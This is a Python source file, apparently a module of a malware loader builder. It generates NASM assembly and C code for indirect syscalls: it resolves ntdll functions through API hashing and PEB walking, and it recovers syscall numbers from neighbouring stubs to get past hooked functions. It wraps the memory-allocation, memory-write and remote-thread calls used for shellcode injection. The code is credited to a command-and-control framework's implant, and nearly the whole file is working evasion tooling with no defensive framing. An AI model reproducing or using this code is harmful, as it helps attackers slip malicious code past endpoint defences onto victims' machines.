import random
import string
import tempfile
import os
import subprocess

class indirectsyscallhash:
    def __init__(self, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))
        self.handle = 'LoadLibrary'
        if 'handle' in arguments:
            if arguments['handle'] in ['LoadLibrary', 'GetModuleHandleA']:
                self.handle = arguments['handle']
            else:
                print("Handle must be either LoadLibrary or GetModuleHandleA")
                exit(0)
        self.functionsignatures = {
            "NtAllocateVirtualMemory":"NTSTATUS NtAllocateVirtualMemory_t(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect)",
            "NtCreateThreadEx":"NTSTATUS NtCreateThreadEx_t(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList)",
            "NtWriteVirtualMemory":"NTSTATUS NtWriteVirtualMemory_t(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten)",
            "NtWaitForSingleObject":"NTSTATUS NtWaitForSingleObject_t(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout)",
        }
        fd, file_path = tempfile.mkstemp(suffix='.asm')
        self.outfd, self.outfile_path = tempfile.mkstemp(suffix='.o')
        with os.fdopen(fd, 'w') as f:
            inline_assembly = """
[BITS 64]

DEFAULT REL

GLOBAL Syscall
extern GetSSN

section .text

; Syscall( PVOID pNtAPI, DWORD64 nArgs, DWORD64 argN, ... )
Syscall:

    ; Some space to work with
    sub rsp, 0x120

    ; Store nonvol regs
    mov [ rsp + 0x8  ], rsi
    mov [ rsp + 0x10 ], rdi
    mov [ rsp + 0x18 ], r12
    mov [ rsp + 0x20 ], r13
    mov [ rsp + 0x28 ], r14
    mov [ rsp + 0x30 ], r15

    ; Store original argument registers before GetSSN clobbers them
    ; r12: will contain pNtAPI
    ; r13: will contain nArgs
    ; r14: will contain arg 3 (arg 1 of the ntapi)
    ; r15: will contain arg 4 (arg 2 of the ntapi)
    mov r12, rcx
    mov r13, rdx
    mov r14, r8
    mov r15, r9

    ; rax: will contain SSN
    call GetSSN

    ; We're gonna use even more space
    sub rsp, 0x160

    ; Move the arguments. Everything to be shifted down 2
    cmp r13, 0
    je Do_Call

    ; It does not matter if we move args to rcx/rdx/r8/r9 if an NtAPI doesn't use them, so move them all just in case
    cmp r13, 4
    mov rcx, r14
    mov rdx, r15
    mov r8, [ rsp + 0x280 + 0x28 ] 
    mov r9, [ rsp + 0x280 + 0x30 ] 
    jle Do_Call


    ; movsq: move QWORD -- RSI -> RDI
    ; rep: repeats RCX amount of times
    ; additional 0x10 offset because technically the 4th arg was in the 6th slot
    mov rcx, r13
    sub rcx, 0x4
    lea rsi, [ rsp + 0x28 + 0x10 + 0x280 ]
    lea rdi, [ rsp + 0x28 ]
    rep movsq

    mov rcx, r14
    mov rdx, r15

Do_Call:

    mov r10, rcx

    syscall

    mov rsi, [ rsp + 0x160 + 0x8  ]
    mov rdi, [ rsp + 0x160 + 0x10 ]
    mov r12, [ rsp + 0x160 + 0x18 ]
    mov r13, [ rsp + 0x160 + 0x20 ]
    mov r14, [ rsp + 0x160 + 0x28 ]
    mov r15, [ rsp + 0x160 + 0x30 ]
    add rsp, 0x280
    
    ret
"""
            f.write(inline_assembly)
        result = subprocess.run(['nasm', '-f', 'win64', file_path, '-o', self.outfile_path])
        os.unlink(file_path)

    def imports(self) -> list[str]:
        return ['#include <windows.h>',
                "#include <winternl.h>",
                "#include <ntdef.h>"]

    def compilerOptions(self) -> list[str]:
        return [self.outfile_path]
    
    def codeblocks(self) -> str:
        ntdll = []
        codeblock = ''
        for apicall in self.apicalls:
            if apicall[0:2] in ['Nt', 'Zw']:
                ntdll.append(apicall)

        codeblock += """

typedef struct _MY_PEB_LDR_DATA
{
	ULONG Length;
	BOOLEAN Initialized;
	HANDLE SsHandle;
	LIST_ENTRY InLoadOrderModuleList;
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID EntryInProgress;
	BOOLEAN ShutdownInProgress;
	HANDLE ShutdownThreadId;
} MY_PEB_LDR_DATA, *MY_PPEB_LDR_DATA;

typedef struct _MY_PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsLegacyProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN SpareBits : 3;
        };
    };
    HANDLE Mutant;

    PVOID ImageBaseAddress;
    MY_PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    union
    {
        ULONG CrossProcessFlags;
        struct
        {
            ULONG ProcessInJob : 1;
            ULONG ProcessInitializing : 1;
            ULONG ProcessUsingVEH : 1;
            ULONG ProcessUsingVCH : 1;
            ULONG ProcessUsingFTH : 1;
            ULONG ReservedBits0 : 27;
        };
        ULONG EnvironmentUpdateCount;
    };
    union
    {
        PVOID KernelCallbackTable;
        PVOID UserSharedInfoPtr;
    };
    ULONG SystemReserved[1];
    ULONG AtlThunkSListPtr32;
    PVOID ApiSetMap;
    ULONG TlsExpansionCounter;
    PVOID TlsBitmap;
    ULONG TlsBitmapBits[2];
    PVOID ReadOnlySharedMemoryBase;
    PVOID HotpatchInformation;
    PVOID* ReadOnlyStaticServerData;
    PVOID AnsiCodePageData;
    PVOID OemCodePageData;
    PVOID UnicodeCaseTableData;

    ULONG NumberOfProcessors;
    ULONG NtGlobalFlag;

    LARGE_INTEGER CriticalSectionTimeout;
    SIZE_T HeapSegmentReserve;
    SIZE_T HeapSegmentCommit;
    SIZE_T HeapDeCommitTotalFreeThreshold;
    SIZE_T HeapDeCommitFreeBlockThreshold;

    ULONG NumberOfHeaps;
    ULONG MaximumNumberOfHeaps;
    PVOID* ProcessHeaps;

    PVOID GdiSharedHandleTable;
    PVOID ProcessStarterHelper;
    ULONG GdiDCAttributeList;

    PRTL_CRITICAL_SECTION LoaderLock;

    ULONG OSMajorVersion;
    ULONG OSMinorVersion;
    USHORT OSBuildNumber;
    USHORT OSCSDVersion;
    ULONG OSPlatformId;
    ULONG ImageSubsystem;
    ULONG ImageSubsystemMajorVersion;
    ULONG ImageSubsystemMinorVersion;
    ULONG_PTR ImageProcessAffinityMask;
    ULONG GdiHandleBuffer[60];
    PVOID PostProcessInitRoutine;

    PVOID TlsExpansionBitmap;
    ULONG TlsExpansionBitmapBits[32];

    ULONG SessionId;

    ULARGE_INTEGER AppCompatFlags;
    ULARGE_INTEGER AppCompatFlagsUser;
    PVOID pShimData;
    PVOID AppCompatInfo;

    UNICODE_STRING CSDVersion;

    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDefaultActivationContextData;
    PVOID SystemAssemblyStorageMap;

    SIZE_T MinimumStackCommit;

    PVOID* FlsCallback;
    LIST_ENTRY FlsListHead;
    PVOID FlsBitmap;
    ULONG FlsBitmapBits[FLS_MAXIMUM_AVAILABLE / (sizeof(ULONG) * 8)];
    ULONG FlsHighIndex;

    PVOID WerRegistrationData;
    PVOID WerShipAssertPtr;
    PVOID pContextData;
    PVOID pImageHeaderHash;
    union
    {
        ULONG TracingFlags;
        struct
        {
            ULONG HeapTracingEnabled : 1;
            ULONG CritSecTracingEnabled : 1;
            ULONG SpareTracingBits : 30;
        };
    };
} MY_PEB, *MY_PPEB;

typedef struct _MY_LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    USHORT TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    ULONG_PTR OriginalBase;
    LARGE_INTEGER LoadTime;
} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;

UINT_PTR HashString( LPVOID String, BOOLEAN IsWide )
{
    ULONG Hash = 5381;
    PUCHAR Ptr = String;

    do
    {
        UCHAR character = *Ptr;
        if ( !*Ptr && !IsWide )
            break;

        if ( character >= 'a' )
            character -= 0x20;

        Hash = ( ( Hash << 5 ) + Hash ) + character; 
        if ( IsWide && ( !*Ptr && !*++Ptr ) )
            break;

        ++Ptr;
    } while ( TRUE );
    return Hash;
} 

PVOID LoadModulePeb( UINT_PTR hModuleHash )
{

    MY_PPEB PPEB_PTR = (MY_PPEB)__readgsqword( 0x60 );
    PLIST_ENTRY Module      = ( ( MY_PPEB ) PPEB_PTR )->Ldr->InLoadOrderModuleList.Flink; 
    PLIST_ENTRY FirstModule = Module;

    WCHAR  SearchModuleLower[ MAX_PATH ]  = { 0 };
    WCHAR  PebModuleLower   [ MAX_PATH ]  = { 0 };

    do
    {
        // Zero a buffer and lowercase the found module name
        PMY_LDR_DATA_TABLE_ENTRY mod = (PMY_LDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(
            Module, MY_LDR_DATA_TABLE_ENTRY, InLoadOrderLinks
        );
        DWORD ModuleHash = HashString(mod->BaseDllName.Buffer, TRUE);

        // If the lowercased strings match, return the address of the DLL
        if ( ModuleHash == hModuleHash ){
            return mod->DllBase;
        }
        Module = Module->Flink;
    } while ( Module && Module != FirstModule );

    return 0;
}


PVOID LoadFunction( PBYTE Module, UINT_PTR FunctionHash )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    LPSTR                   FoundName        = NULL;
    PCHAR FunctionName = NULL;

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    
    // Resolve absolute address of important export directory members
    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    // Walk through the number of names
    for ( DWORD I = 0; I < ExpDirectory->NumberOfNames; I++ )
    {
        // Zero a buffer to contain the found function, lowercased
        FunctionName = ( PCHAR ) Module + AddrOfNames[ I ];

        // Check if the lowercased strings match
        if ( HashString( FunctionName, FALSE ) == FunctionHash )
        {
            // If they match, resolve the address of the function's code
            FunctionAddr = Module + AddrOfFunctions[ AddrOfOrdinals[ I ] ];

            if ( 
                (void *)FunctionAddr > (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress) && 
                (void *)FunctionAddr < (void *)(Module + NtHeader->OptionalHeader.DataDirectory[ 0 ].VirtualAddress + NtHeader->OptionalHeader.DataDirectory[ 0 ].Size)
            ) // Forwarders are inside export table
            {
                // We can use getProcAddr to resolve forwarders
                // Manually is difficult -- we may run into apisets rather than simple [module].[export] strings
                return GetProcAddress( (HMODULE)Module, FoundName );
            }
            return FunctionAddr;
        }
    }
    return NULL;
}

extern NTSTATUS Syscall(...);
        
DWORD GetFunctionSize( PVOID Function )
{
    PIMAGE_NT_HEADERS       NtHeader         = NULL;
    PIMAGE_EXPORT_DIRECTORY ExpDirectory     = NULL;
    SIZE_T                  ExpDirectorySize = 0;
    PDWORD                  AddrOfFunctions  = NULL;
    PDWORD                  AddrOfNames      = NULL;
    PWORD                   AddrOfOrdinals   = NULL;
    PVOID                   FunctionAddr     = NULL;
    PCHAR                   FunctionName     = NULL;
    PBYTE                   Addr1            = NULL;
    PBYTE                   Addr2            = NULL;
    DWORD                   SyscallSize      = 0;
    DWORD                   Offset           = 0;
    PBYTE                   Module           = (PBYTE) GetModuleHandleA( "ntdll.dll" );

    NtHeader         = (PIMAGE_NT_HEADERS)(Module + ( ( PIMAGE_DOS_HEADER ) Module )->e_lfanew);
    ExpDirectory     = (PIMAGE_EXPORT_DIRECTORY)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress);
    ExpDirectorySize = (SIZE_T)(Module + NtHeader->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size);

    AddrOfNames      = (PDWORD)(Module + ExpDirectory->AddressOfNames);
    AddrOfFunctions  = (PDWORD)(Module + ExpDirectory->AddressOfFunctions);
    AddrOfOrdinals   = (PWORD)(Module + ExpDirectory->AddressOfNameOrdinals);

    for ( DWORD i = 0; i < ExpDirectory->NumberOfNames; i++ )
    {
        if ( ( PBYTE ) FunctionAddr >= ( PBYTE ) ExpDirectory &&
             ( PBYTE ) FunctionAddr <  ( PBYTE ) ExpDirectory + ExpDirectorySize )
            continue;

        // make sure is a system call (compare initial bytes to Zw)
        FunctionName = ( PCHAR ) Module + AddrOfNames[ i ];
        if ( *( PWORD )FunctionName != 0x775a )
            continue;

        // save one random syscall addr
        if ( ! Addr1 )
        {
            Addr1 = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            continue;
        }
        else
        {
            // get the distance between our saved syscall addr and this one
            Addr2  = Module + AddrOfFunctions[ AddrOfOrdinals[ i ] ];
            Offset = Addr1 > Addr2 ? Addr1 - Addr2 : Addr2 - Addr1;

            // if the distance is the smallest we have seen so far, save it
            if ( ! SyscallSize || Offset < SyscallSize ) {
                SyscallSize = Offset;
            }
        }
    }

    // by now, we should have the size of a syscall stub
    return SyscallSize;
}

/*
Original implementations from @C5pider, from Demon's implementation in the Havoc Framework

@ Params
    NtFunction    - A pointer to the function which we want the SSN of
    SSN           - A pointer to a WORD which will be populated with the SSN if successful

@ Return
    1 for success, 0 for failure
*/
BOOLEAN GetSSNInternal( PBYTE NtFunction, PWORD SSN )
{
    DWORD Offset  = 0;
    BYTE  SSNLow  = 0;
    BYTE  SSNHigh = 0;
    BOOL  Success = FALSE;

    if ( !SSN )
        return FALSE;

    do {

        // We've reached the end of the Nt/Zw function
        if ( *( NtFunction + Offset ) == 0xC3 ) {
            break;
        }

        // Checking for the move r10, rcx and mov rcx, [ssn] instructions
        if ( *( NtFunction + Offset + 0 ) == 0x4C &&
             *( NtFunction + Offset + 1 ) == 0x8B &&
             *( NtFunction + Offset + 2 ) == 0xD1 &&
             *( NtFunction + Offset + 3 ) == 0xB8 )
        {
            // The first byte after those instructions is the lower byte of the SSN
            SSNLow  = *( NtFunction + Offset + 4 );

            // The seccond byte after those instructions is the upper byte of the SSN
            SSNHigh = *( NtFunction + Offset + 5 );

            // Combine the bytes into a word
            *SSN     = ( SSNHigh << 8 ) | SSNLow ;
            return TRUE;
        }

        Offset++;

    } while ( TRUE );

    return FALSE;
}

/*
Original implementations from @C5pider, from Demon's implementation in the Havoc Framework

@ Params
    NtFunction    - A pointer to the function which we want the SSN of

@ Return
    The SSN
*/
WORD GetSSN( PBYTE NtFunction ) 
{

    BOOLEAN Success   = FALSE; 
    WORD    SSN       = 0;
    DWORD   Counter   = 0;
    DWORD   SzNtApi   = 0;
    PVOID   Neighbour = NULL;

    if ( GetSSNInternal( NtFunction, &SSN ) )
        return SSN;

    else {

        // All Nt/Zw functions have the same stub size, we'll use it as a reference to find neighbours
        SzNtApi = GetFunctionSize( NtFunction ); 

        // If the NtFunction was hooked, start calling GetSSNInternal on its neighbours. ~400 neighbours or so
        while ( SSN == 0 && Counter < 200 ) {

            // Upper neighbour
            Neighbour = ( NtFunction ) + ( SzNtApi * Counter );
            if ( GetSSNInternal( Neighbour, &SSN ) ){
                SSN   -= Counter;
                break;
            }

            // Lower neighbour
            Neighbour = ( NtFunction ) - ( SzNtApi * Counter );
            if ( GetSSNInternal( Neighbour, &SSN ) ){
                SSN   += Counter;
                break;
            }

            Counter++;
        }
    }

    return SSN;

}
"""


        if 'NtCreateThreadEx' in ntdll:
            codeblock += """
typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
        

_Struct_size_bytes_(TotalLength)
typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
"""
        if 'NtAllocateVirtualMemory' in ntdll:
            codeblock += f"""
NTSTATUS NtAllocateVirtualMemory_t(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect){{
    PBYTE pNtAPI = (PBYTE)LoadFunction(LoadModulePeb({self.hash_string('ntdll.dll')}), {self.hash_string('NtAllocateVirtualMemory', False)});
    NTSTATUS Status = Syscall( pNtAPI, 6, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect );
    return Status;
}}
"""

        if 'NtWriteVirtualMemory' in ntdll:
            codeblock += f"""
NTSTATUS NtWriteVirtualMemory_t(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten){{
    PBYTE pNtAPI = (PBYTE)LoadFunction(LoadModulePeb({self.hash_string('ntdll.dll')}), {self.hash_string('NtWriteVirtualMemory', False)});
    NTSTATUS Status = Syscall( pNtAPI, 5, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten );
    return Status;
}}
"""

        if 'NtCreateThreadEx' in ntdll:
            codeblock += f"""
NTSTATUS NtCreateThreadEx_t(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList){{
    PBYTE pNtAPI = (PBYTE)LoadFunction(LoadModulePeb({self.hash_string('ntdll.dll')}), {self.hash_string('NtCreateThreadEx', False)});
    NTSTATUS Status = Syscall( pNtAPI, 11, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList );
    return Status;
}}
"""

        if 'NtWaitForSingleObject' in ntdll:
            codeblock += f"""
NTSTATUS NtWaitForSingleObject_t(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout){{
    PBYTE pNtAPI = (PBYTE)LoadFunction(LoadModulePeb({self.hash_string('ntdll.dll')}), {self.hash_string('NtWaitForSingleObject', False)});
    NTSTATUS Status = Syscall( pNtAPI, 3, Handle, Alertable, Timeout);
    return Status;
}}
"""

        return codeblock

    def resolve(self, apicalls):
        resolved = {}
        self.apicalls = apicalls
        for apicall in apicalls:
            if 'Nt' not in apicall:
                resolved[apicall] = apicall
            else:
                resolved[apicall] = f'{apicall}_t'
        return resolved

    def hash_string(self, functionName, isWide=True ):
        # The hash value (5381 in this case) has to be the same for the Python script and the C code
        hash = 5381
        # Convert the input string to uppercase for case insensitivity
        functionName = functionName.upper()

        for x in range(0, len(functionName), 1):
            # If isWide is False or it's the first character
            if x == 0 or not isWide:
                # Incorporate the ordinal value of the character into hash calculation
                hash = (( hash << 5 ) + hash ) + ord(functionName[x])

            if isWide:
                # Only perform hash calculation without including ordinal value of character
                hash = (( hash << 5 ) + hash )

                # Check if it's the end of the string for wide strings
                if x == len(functionName):
                    hash = (( hash << 5 ) + hash )

        return hash & 0xFFFFFFFF 